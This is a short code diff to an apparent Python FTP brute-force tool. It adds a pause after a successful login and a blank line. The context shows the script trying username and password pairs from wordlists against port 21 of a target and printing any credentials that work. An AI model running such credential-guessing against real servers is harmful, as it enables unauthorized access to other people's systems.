@@ -7,6 +7,7 @@ def ftp(target, username, password):
         ftp.connect(target, 21)
         ftp.login(username, password)
         print(f"[BruteFTP] {target}:21      - {target}:21 - Success: '{username}:{password}'")
+        input()
         ftp.quit()
         sys.exit(0)
     except Exception:
@@ -30,4 +31,5 @@ if __name__ == "__main__":
     wordlist = input("[*] wordlist : ")
     print(f"[*] Running for {target}:21")
     bruteforce(target, userlist, wordlist)
+
     print(f"[-] [BruteDuck] {target}:21      - {target}:21 - PASS Error")
